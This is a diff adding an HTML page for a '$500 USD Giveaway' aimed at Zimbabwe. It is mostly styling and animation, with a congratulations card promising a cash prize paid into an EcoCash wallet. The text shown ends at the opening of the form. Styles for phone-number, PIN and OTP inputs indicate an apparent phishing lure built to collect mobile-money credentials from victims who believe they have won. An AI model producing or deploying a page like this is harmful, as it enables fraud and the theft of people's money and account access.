@@ -1,0 +1,1531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>$500 USD Giveaway • Zimbabwe</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
+    <style>
+        /* ─── RESET ─── */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --gold: #f5b342;
+            --gold-light: #ffd966;
+            --gold-dark: #c78a2b;
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --glass-shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
+            --glass-blur: 20px;
+            --radius: 20px;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background: #0a0c12;
+            color: #fff;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* ─── VIDEO BACKGROUND ─── */
+        #video-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background: #0a0c12;
+            overflow: hidden;
+        }
+
+        #video-bg video {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            min-width: 100%;
+            min-height: 100%;
+            transform: translate(-50%, -50%);
+            object-fit: cover;
+        }
+
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(ellipse at center, transparent 30%, rgba(0, 0, 0, 0.75) 100%);
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        /* ─── FLASHY EFFECTS ─── */
+        .flash-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 5;
+            background: radial-gradient(circle at center, rgba(245, 179, 66, 0.1), transparent 70%);
+            animation: flashPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes flashPulse {
+            0%, 100% { opacity: 0.3; transform: scale(1); }
+            50% { opacity: 0.8; transform: scale(1.1); }
+        }
+
+        .sparkle-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 4;
+            overflow: hidden;
+        }
+
+        .sparkle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: var(--gold-light);
+            border-radius: 50%;
+            animation: sparkleFloat 3s ease-in-out infinite;
+            box-shadow: 0 0 20px rgba(245, 179, 66, 0.6);
+        }
+
+        .sparkle:nth-child(1) { top: 10%; left: 15%; animation-delay: 0s; }
+        .sparkle:nth-child(2) { top: 20%; left: 85%; animation-delay: 0.5s; }
+        .sparkle:nth-child(3) { top: 60%; left: 10%; animation-delay: 1s; }
+        .sparkle:nth-child(4) { top: 70%; left: 90%; animation-delay: 1.5s; }
+        .sparkle:nth-child(5) { top: 40%; left: 50%; animation-delay: 2s; }
+        .sparkle:nth-child(6) { top: 85%; left: 30%; animation-delay: 0.8s; }
+        .sparkle:nth-child(7) { top: 15%; left: 50%; animation-delay: 1.2s; }
+        .sparkle:nth-child(8) { top: 50%; left: 75%; animation-delay: 1.8s; }
+
+        @keyframes sparkleFloat {
+            0%, 100% { transform: translateY(0) scale(1); opacity: 0.3; }
+            50% { transform: translateY(-30px) scale(2); opacity: 1; }
+        }
+
+        /* ─── CROWD SCENE ─── */
+        .crowd-scene {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 30%;
+            z-index: 2;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        .crowd {
+            display: flex;
+            align-items: flex-end;
+            justify-content: space-around;
+            height: 100%;
+            padding: 0 15px;
+            gap: 4px;
+        }
+
+        .person {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: bob 3s ease-in-out infinite;
+            opacity: 0.5;
+        }
+
+        .person:nth-child(odd) { animation-delay: 0.3s; opacity: 0.7; }
+        .person:nth-child(3n) { animation-delay: 0.7s; opacity: 0.6; }
+        .person:nth-child(5n+2) { animation-delay: 0.1s; opacity: 0.8; }
+
+        @keyframes bob {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-6px); }
+        }
+
+        .head {
+            width: 18px;
+            height: 18px;
+            background: radial-gradient(ellipse at 40% 30%, rgba(60,60,70,0.8), rgba(20,20,25,0.9));
+            border-radius: 50%;
+            margin-bottom: -3px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .head .ring {
+            position: absolute;
+            top: -6px;
+            left: -6px;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            border: 2px solid rgba(245, 179, 66, 0.25);
+            animation: ringPulse 1.8s ease-out infinite;
+            pointer-events: none;
+        }
+
+        .head .ring:nth-child(2) {
+            animation-delay: 0.6s;
+            border-color: rgba(74, 222, 128, 0.15);
+        }
+
+        @keyframes ringPulse {
+            0% { transform: scale(0.7); opacity: 1; }
+            100% { transform: scale(2); opacity: 0; }
+        }
+
+        .body {
+            width: 26px;
+            height: 32px;
+            background: radial-gradient(ellipse at 30% 30%, rgba(40,40,50,0.8), rgba(10,10,15,0.95));
+            border-radius: 8px 8px 4px 4px;
+            position: relative;
+            border: 1px solid rgba(255,255,255,0.03);
+        }
+
+        .phone {
+            position: absolute;
+            right: -12px;
+            top: 6px;
+            width: 20px;
+            height: 16px;
+            background: radial-gradient(ellipse at 30% 30%, rgba(50,50,60,0.7), rgba(20,20,25,0.8));
+            border-radius: 6px 6px 2px 2px;
+            animation: tap 2.2s ease-in-out infinite;
+        }
+
+        .phone::before {
+            content: '📱';
+            position: absolute;
+            top: -10px;
+            left: -2px;
+            font-size: 12px;
+            animation: glow 1.6s ease-in-out infinite;
+        }
+
+        @keyframes tap {
+            0%, 100% { transform: rotate(-8deg) translateY(0); }
+            30% { transform: rotate(-3deg) translateY(-4px); }
+            60% { transform: rotate(-12deg) translateY(2px); }
+        }
+
+        @keyframes glow {
+            0%, 100% { opacity: 0.7; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.1); filter: drop-shadow(0 0 10px rgba(245,179,66,0.4)); }
+        }
+
+        .person.excited .body {
+            animation: jump 1.2s ease-in-out infinite;
+        }
+
+        @keyframes jump {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-14px); }
+        }
+
+        .person.excited .phone {
+            animation: excitedTap 0.9s ease-in-out infinite;
+        }
+
+        @keyframes excitedTap {
+            0%, 100% { transform: rotate(-12deg) translateY(0); }
+            50% { transform: rotate(-3deg) translateY(-8px); }
+        }
+
+        /* Crowd confetti */
+        .crowd-confetti {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        .crowd-confetti span {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            border-radius: 1px;
+            animation: confettiFall 4.5s linear infinite;
+            opacity: 0;
+        }
+
+        .crowd-confetti span:nth-child(1) { left: 8%; animation-delay: 0s; background: #f5b342; }
+        .crowd-confetti span:nth-child(2) { left: 18%; animation-delay: 1.4s; background: #4ade80; }
+        .crowd-confetti span:nth-child(3) { left: 28%; animation-delay: 0.6s; background: #f87171; }
+        .crowd-confetti span:nth-child(4) { left: 42%; animation-delay: 2.2s; background: #ffd966; }
+        .crowd-confetti span:nth-child(5) { left: 55%; animation-delay: 0.9s; background: #c084fc; }
+        .crowd-confetti span:nth-child(6) { left: 65%; animation-delay: 1.7s; background: #f472b6; }
+        .crowd-confetti span:nth-child(7) { left: 75%; animation-delay: 0.4s; background: #f5b342; }
+        .crowd-confetti span:nth-child(8) { left: 88%; animation-delay: 2s; background: #4ade80; }
+        .crowd-confetti span:nth-child(9) { left: 12%; animation-delay: 2.8s; background: #60a5fa; }
+        .crowd-confetti span:nth-child(10) { left: 48%; animation-delay: 0.8s; background: #f87171; }
+        .crowd-confetti span:nth-child(11) { left: 72%; animation-delay: 1.5s; background: #ffd966; }
+        .crowd-confetti span:nth-child(12) { left: 32%; animation-delay: 1s; background: #c084fc; }
+
+        @keyframes confettiFall {
+            0% { transform: translateY(-20px) rotate(0) scale(0); opacity: 0; }
+            15% { opacity: 0.8; transform: translateY(0) rotate(60deg) scale(1); }
+            85% { opacity: 0.8; }
+            100% { transform: translateY(80px) rotate(180deg) scale(0.4); opacity: 0; }
+        }
+
+        /* ─── FALLING DOLLARS ─── */
+        #dollars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+            overflow: hidden;
+            opacity: 0.12;
+        }
+
+        .dollar {
+            position: absolute;
+            top: -40px;
+            font-size: 20px;
+            animation: fall linear infinite;
+            user-select: none;
+            filter: drop-shadow(0 0 10px rgba(245, 179, 66, 0.1));
+        }
+
+        @keyframes fall {
+            0% { transform: translateY(0) rotate(0deg) scale(0.8); opacity: 0; }
+            10% { opacity: 1; }
+            100% { transform: translateY(calc(100vh + 100px)) rotate(720deg) scale(1.2); opacity: 0; }
+        }
+
+        /* ─── SCANLINES ─── */
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
+            pointer-events: none;
+            z-index: 3;
+            animation: scan 8s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(4px); }
+        }
+
+        /* ─── GLASS CARD ─── */
+        .card {
+            max-width: 480px;
+            width: 100%;
+            background: var(--glass-bg);
+            backdrop-filter: blur(var(--glass-blur)) saturate(1.5);
+            -webkit-backdrop-filter: blur(var(--glass-blur)) saturate(1.5);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius);
+            padding: 36px 28px 32px;
+            box-shadow: var(--glass-shadow), inset 0 1px 0 rgba(255,255,255,0.06), 0 0 80px rgba(245, 179, 66, 0.05);
+            position: relative;
+            z-index: 10;
+            animation: fadeIn 0.8s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px) scale(0.96); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: -60%;
+            left: -60%;
+            width: 220%;
+            height: 220%;
+            background: radial-gradient(circle at 30% 20%, rgba(255,255,255,0.04) 0%, transparent 60%);
+            pointer-events: none;
+            z-index: 0;
+            animation: shimmer 10s ease-in-out infinite;
+        }
+
+        @keyframes shimmer {
+            0%, 100% { transform: translate(-10%, -10%); }
+            50% { transform: translate(10%, 10%); }
+        }
+
+        .card > * { position: relative; z-index: 1; }
+
+        /* ─── FLASHY BADGE ─── */
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(245, 179, 66, 0.15);
+            backdrop-filter: blur(6px);
+            border: 1px solid rgba(245, 179, 66, 0.2);
+            border-radius: 50px;
+            padding: 5px 14px 5px 8px;
+            font-size: 10px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--gold-light);
+            margin-bottom: 16px;
+            animation: badgePulse 2s ease-in-out infinite;
+            box-shadow: 0 0 30px rgba(245, 179, 66, 0.1);
+        }
+
+        @keyframes badgePulse {
+            0%, 100% { box-shadow: 0 0 30px rgba(245, 179, 66, 0.1); }
+            50% { box-shadow: 0 0 60px rgba(245, 179, 66, 0.2); }
+        }
+
+        .badge .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #4ade80;
+            animation: pulse 1.8s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.7); }
+        }
+
+        /* ─── TITLE ─── */
+        .title {
+            font-size: 30px;
+            font-weight: 800;
+            line-height: 1.15;
+            letter-spacing: -0.5px;
+            margin-bottom: 4px;
+        }
+
+        .title .gold {
+            background: linear-gradient(135deg, var(--gold-light), var(--gold));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: titleGlow 2s ease-in-out infinite;
+        }
+
+        @keyframes titleGlow {
+            0%, 100% { filter: drop-shadow(0 0 10px rgba(245, 179, 66, 0.2)); }
+            50% { filter: drop-shadow(0 0 30px rgba(245, 179, 66, 0.5)); }
+        }
+
+        .sub-title {
+            font-size: 15px;
+            color: var(--gold-light);
+            font-weight: 600;
+            margin-bottom: 4px;
+            animation: textPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes textPulse {
+            0%, 100% { opacity: 0.8; }
+            50% { opacity: 1; }
+        }
+
+        .desc {
+            font-size: 14px;
+            color: rgba(255,255,255,0.5);
+            line-height: 1.6;
+            margin-bottom: 22px;
+        }
+
+        /* ─── FLASHY BOUNCING PRIZE BOX ─── */
+        .prize-box {
+            background: rgba(245, 179, 66, 0.08);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(245, 179, 66, 0.15);
+            border-radius: 14px;
+            padding: 16px 18px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 24px;
+            transition: 0.3s;
+            animation: bouncePrize 1.5s ease-in-out infinite;
+            position: relative;
+            cursor: default;
+            box-shadow: 0 4px 30px rgba(245, 179, 66, 0.1);
+        }
+
+        .prize-box::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 130%;
+            height: 130%;
+            background: radial-gradient(ellipse at center, rgba(245, 179, 66, 0.12) 0%, transparent 70%);
+            pointer-events: none;
+            z-index: -1;
+            animation: glowPulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes bouncePrize {
+            0%, 100% {
+                transform: translateY(0) scale(1);
+                box-shadow: 0 4px 30px rgba(245, 179, 66, 0.1);
+            }
+            15% {
+                transform: translateY(-10px) scale(1.03);
+                box-shadow: 0 8px 50px rgba(245, 179, 66, 0.25);
+            }
+            30% {
+                transform: translateY(0) scale(1);
+                box-shadow: 0 4px 30px rgba(245, 179, 66, 0.1);
+            }
+            45% {
+                transform: translateY(-6px) scale(1.02);
+                box-shadow: 0 6px 40px rgba(245, 179, 66, 0.2);
+            }
+            60% {
+                transform: translateY(0) scale(1);
+                box-shadow: 0 4px 30px rgba(245, 179, 66, 0.1);
+            }
+            80% {
+                transform: translateY(-3px) scale(1.01);
+                box-shadow: 0 5px 35px rgba(245, 179, 66, 0.15);
+            }
+        }
+
+        @keyframes glowPulse {
+            0%, 100% { opacity: 0.5; transform: translate(-50%, -50%) scale(1); }
+            50% { opacity: 1; transform: translate(-50%, -50%) scale(1.3); }
+        }
+
+        .prize-box:hover {
+            animation-play-state: paused;
+            border-color: rgba(245, 179, 66, 0.35);
+        }
+
+        .prize-box .icon {
+            font-size: 32px;
+            line-height: 1;
+            animation: iconBounce 1.5s ease-in-out infinite;
+        }
+
+        @keyframes iconBounce {
+            0%, 100% { transform: scale(1) rotate(0deg); }
+            15% { transform: scale(1.2) rotate(-8deg); }
+            30% { transform: scale(1) rotate(0deg); }
+            45% { transform: scale(1.1) rotate(5deg); }
+            60% { transform: scale(1) rotate(0deg); }
+        }
+
+        .prize-box .info { flex: 1; }
+        .prize-box .label { 
+            font-size: 11px; 
+            font-weight: 600; 
+            text-transform: uppercase; 
+            letter-spacing: 0.6px; 
+            color: var(--gold-light); 
+            opacity: 0.8;
+        }
+        
+        .prize-box .amount {
+            font-size: 32px;
+            font-weight: 800;
+            color: var(--gold);
+            display: inline-block;
+            animation: amountBounce 1.5s ease-in-out infinite;
+            text-shadow: 0 0 40px rgba(245, 179, 66, 0.2);
+        }
+
+        @keyframes amountBounce {
+            0%, 100% { transform: scale(1); text-shadow: 0 0 40px rgba(245, 179, 66, 0.2); }
+            15% { transform: scale(1.1); text-shadow: 0 0 60px rgba(245, 179, 66, 0.4); }
+            30% { transform: scale(1); text-shadow: 0 0 40px rgba(245, 179, 66, 0.2); }
+            45% { transform: scale(1.05); text-shadow: 0 0 50px rgba(245, 179, 66, 0.3); }
+            60% { transform: scale(1); text-shadow: 0 0 40px rgba(245, 179, 66, 0.2); }
+        }
+
+        .prize-box .amount small { 
+            font-size: 18px; 
+            font-weight: 600; 
+            color: rgba(255,255,255,0.4);
+            animation: smallBounce 1.5s ease-in-out infinite;
+        }
+
+        @keyframes smallBounce {
+            0%, 100% { transform: scale(1); }
+            15% { transform: scale(0.92); }
+            45% { transform: scale(0.95); }
+        }
+
+        /* ─── WALLET BADGE ─── */
+        .wallet-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(0, 168, 89, 0.12);
+            backdrop-filter: blur(6px);
+            border: 1px solid rgba(0, 168, 89, 0.2);
+            border-radius: 50px;
+            padding: 3px 12px 3px 8px;
+            font-size: 11px;
+            font-weight: 600;
+            color: #4ade80;
+            margin-top: 4px;
+            animation: walletPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes walletPulse {
+            0%, 100% { opacity: 0.7; box-shadow: 0 0 20px rgba(0, 168, 89, 0.05); }
+            50% { opacity: 1; box-shadow: 0 0 40px rgba(0, 168, 89, 0.15); }
+        }
+
+        .wallet-badge svg { width: 14px; height: 14px; }
+
+        /* ─── FORM ─── */
+        .form-group { margin-bottom: 18px; }
+        .form-group label { display: block; font-size: 12px; font-weight: 600; color: rgba(255,255,255,0.5); margin-bottom: 5px; letter-spacing: 0.3px; }
+        .form-group label .req { color: #f87171; }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+            background: rgba(255,255,255,0.03);
+            backdrop-filter: blur(8px);
+            border: 1.5px solid rgba(255,255,255,0.06);
+            border-radius: 12px;
+            transition: 0.3s;
+        }
+
+        .input-group:focus-within {
+            border-color: var(--gold);
+            background: rgba(255,255,255,0.05);
+            box-shadow: 0 0 0 4px rgba(245,179,66,0.05), 0 0 30px rgba(245,179,66,0.05);
+        }
+
+        .input-group .prefix {
+            padding: 12px 0 12px 16px;
+            font-size: 15px;
+            font-weight: 600;
+            color: rgba(255,255,255,0.5);
+            white-space: nowrap;
+        }
+
+        .input-group input {
+            flex: 1;
+            padding: 12px 16px 12px 6px;
+            font-size: 15px;
+            font-family: inherit;
+            font-weight: 500;
+            background: transparent;
+            border: none;
+            color: #fff;
+            outline: none;
+        }
+
+        .input-group input::placeholder { color: rgba(255,255,255,0.15); }
+
+        .input-group input.error {
+            border-color: #f87171;
+        }
+
+        .input-hint {
+            font-size: 11px;
+            color: rgba(255,255,255,0.3);
+            margin-top: 5px;
+        }
+
+        .input-hint.error { color: #f87171; }
+
+        /* ─── PHONE NUMBER SPECIFIC FORMAT ─── */
+        .phone-input .prefix {
+            font-size: 14px;
+            letter-spacing: 0.5px;
+        }
+
+        .phone-input input {
+            font-family: 'Inter', monospace;
+            letter-spacing: 1px;
+        }
+
+        .phone-input input::placeholder {
+            letter-spacing: 0.5px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* ─── PIN WITH TOGGLE ─── */
+        .pin-wrap {
+            position: relative;
+        }
+
+        .pin-wrap .toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.05);
+            border-radius: 6px;
+            color: rgba(255,255,255,0.4);
+            font-size: 16px;
+            cursor: pointer;
+            padding: 4px 7px;
+            transition: 0.3s;
+            line-height: 1;
+        }
+
+        .pin-wrap .toggle:hover {
+            opacity: 1;
+            background: rgba(255,255,255,0.08);
+        }
+
+        /* ─── ECOCASH LOGO ─── */
+        .ecocash {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: linear-gradient(135deg, #00a859, #00c46a);
+            padding: 3px 12px 3px 8px;
+            border-radius: 50px;
+            color: #fff;
+            font-weight: 700;
+            font-size: 12px;
+            box-shadow: 0 2px 16px rgba(0,168,89,0.2);
+            margin-right: 4px;
+        }
+
+        .ecocash svg { width: 20px; height: 20px; }
+        .ecocash span { font-weight: 800; letter-spacing: 0.3px; }
+        .ecocash span em { color: #f7b731; font-style: normal; }
+
+        /* ─── FLASHY BUTTON ─── */
+        .btn {
+            width: 100%;
+            padding: 15px 20px;
+            font-size: 15px;
+            font-weight: 700;
+            font-family: inherit;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: 0.3s;
+            position: relative;
+            overflow: hidden;
+            margin-top: 6px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+            color: #0b0d12;
+            box-shadow: 0 4px 30px rgba(245,179,66,0.25);
+            animation: btnPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes btnPulse {
+            0%, 100% { box-shadow: 0 4px 30px rgba(245,179,66,0.25); }
+            50% { box-shadow: 0 4px 50px rgba(245,179,66,0.4); }
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.6s;
+        }
+
+        .btn-primary:hover:not(:disabled)::before { left: 100%; }
+        .btn-primary:hover:not(:disabled) { transform: translateY(-2px) scale(1.02); box-shadow: 0 6px 50px rgba(245,179,66,0.4); }
+        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+        .btn .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2.5px solid rgba(11,13,18,0.15);
+            border-top-color: #0b0d12;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            display: inline-block;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ─── SUCCESS ─── */
+        .success {
+            display: none;
+            text-align: center;
+            padding: 16px 0 4px;
+            animation: fadeUp 0.6s ease forwards;
+        }
+
+        .success.active { display: block; }
+
+        .success .check {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #4ade80, #22c55e);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 34px;
+            color: #0b0d12;
+            box-shadow: 0 8px 40px rgba(74,222,128,0.3);
+            animation: pop 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+
+        @keyframes pop {
+            0% { transform: scale(0.4); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .success h2 { font-size: 22px; font-weight: 800; margin-bottom: 8px; }
+        .success p { color: rgba(255,255,255,0.5); font-size: 14px; line-height: 1.7; max-width: 340px; margin: 0 auto; }
+        .success p .hl { color: var(--gold-light); font-weight: 600; }
+
+        /* ─── STATUS BAR ─── */
+        .status {
+            margin-top: 16px;
+            padding: 10px 14px;
+            border-radius: 12px;
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.04);
+            display: none;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: rgba(255,255,255,0.5);
+            transition: all 0.3s ease;
+        }
+
+        .status.active { display: flex; }
+        .status .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--gold);
+            animation: pulse 1.5s ease-in-out infinite;
+            flex-shrink: 0;
+        }
+        .status .dot.success { background: #4ade80; animation: none; }
+        .status .dot.error { background: #f87171; animation: none; }
+
+        /* ─── FOOTER ─── */
+        .footer {
+            margin-top: 20px;
+            font-size: 10px;
+            color: rgba(255,255,255,0.1);
+            text-align: center;
+            border-top: 1px solid rgba(255,255,255,0.03);
+            padding-top: 16px;
+            letter-spacing: 0.3px;
+        }
+
+        /* ─── CONFETTI ─── */
+        #confetti {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+            overflow: hidden;
+        }
+
+        .confetti-piece {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            top: -10px;
+            animation: confettiRain linear forwards;
+        }
+
+        @keyframes confettiRain {
+            0% { transform: translateY(0) rotate(0) scale(1); opacity: 1; }
+            100% { transform: translateY(110vh) rotate(720deg) scale(0.3); opacity: 0; }
+        }
+
+        .hidden-input {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+        }
+
+        /* ─── RESPONSIVE ─── */
+        @media (max-width: 540px) {
+            .card { padding: 26px 18px 24px; border-radius: 16px; }
+            .title { font-size: 24px; }
+            .prize-box .amount { font-size: 26px; }
+            .prize-box { padding: 14px 16px; }
+            .crowd-scene { height: 22%; }
+            .person .body { width: 20px; height: 24px; }
+            .person .head { width: 14px; height: 14px; }
+            .person .phone { width: 16px; height: 12px; right: -10px; }
+            .person .phone::before { font-size: 10px; top: -8px; }
+            .crowd { gap: 2px; padding: 0 8px; }
+            .sparkle { display: none; }
+        }
+
+        @media (max-width: 380px) {
+            .card { padding: 18px 12px 20px; }
+            .title { font-size: 20px; }
+            .prize-box .amount { font-size: 22px; }
+            .crowd-scene { height: 18%; }
+            .person .body { width: 16px; height: 20px; }
+            .person .head { width: 12px; height: 12px; }
+        }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(16px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .format-hint {
+            font-size: 11px;
+            color: rgba(255,255,255,0.2);
+            margin-top: 4px;
+            font-family: 'Inter', monospace;
+            letter-spacing: 0.5px;
+        }
+
+        .otp-status {
+            font-size: 11px;
+            color: rgba(255,255,255,0.2);
+            text-align: center;
+            margin-top: 8px;
+            display: none;
+        }
+        .otp-status.active { display: block; }
+        .otp-status .highlight { color: var(--gold-light); }
+    </style>
+</head>
+<body>
+
+    <!-- ─── VIDEO BACKGROUND ─── -->
+    <div id="video-bg">
+        <video autoplay loop muted playsinline preload="auto">
+            <source src="https://assets.mixkit.co/videos/preview/mixkit-people-celebrating-with-fireworks-3363-large.mp4" type="video/mp4" />
+            <source src="https://assets.mixkit.co/videos/preview/mixkit-celebratory-fireworks-over-the-city-1231-large.mp4" type="video/mp4" />
+            <source src="https://assets.mixkit.co/videos/preview/mixkit-people-dancing-at-a-party-2629-large.mp4" type="video/mp4" />
+        </video>
+        <div class="video-overlay"></div>
+        
+        <!-- Crowd Scene -->
+        <div class="crowd-scene">
+            <div class="crowd-confetti">
+                <span></span><span></span><span></span><span></span><span></span>
+                <span></span><span></span><span></span><span></span><span></span>
+                <span></span><span></span>
+            </div>
+            <div class="crowd">
+                <div class="person excited"><div class="head"><div class="ring"></div><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ─── FLASHY EFFECTS ─── -->
+    <div class="flash-overlay"></div>
+    <div class="sparkle-container">
+        <div class="sparkle"></div>
+        <div class="sparkle"></div>
+        <div class="sparkle"></div>
+        <div class="sparkle"></div>
+        <div class="sparkle"></div>
+        <div class="sparkle"></div>
+        <div class="sparkle"></div>
+        <div class="sparkle"></div>
+    </div>
+
+    <!-- ─── SCANLINES ─── -->
+    <div class="scanlines"></div>
+
+    <!-- ─── FALLING DOLLARS ─── -->
+    <div id="dollars"></div>
+
+    <!-- ─── CONFETTI CONTAINER ─── -->
+    <div id="confetti"></div>
+
+    <!-- ─── MAIN CARD ─── -->
+    <div class="card">
+
+        <div class="badge">
+            <span class="dot"></span>
+            🇿🇼 Zimbabwe • Limited Offer • ⚡ Flash Giveaway
+        </div>
+
+        <div class="sub-title">🎉 Congratulations!</div>
+        <h1 class="title">You've been selected for<br /><span class="gold">$500 USD</span></h1>
+        <p class="desc">Official cash prize — claim your reward today</p>
+
+        <!-- ─── FLASHY BOUNCING PRIZE BOX ─── -->
+        <div class="prize-box">
+            <span class="icon">🏆</span>
+            <div class="info">
+                <div class="label">💰 Your Prize</div>
+                <div class="amount">$500 <small>USD</small></div>
+                <div class="wallet-badge">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="2" y="5" width="20" height="14" rx="2"/>
+                        <path d="M16 12a2 2 0 1 1 4 0"/>
+                    </svg>
+                    <span>Deposits to EcoCash Wallet</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ─── FORM ─── -->
+        <form id="form" novalidate>
+
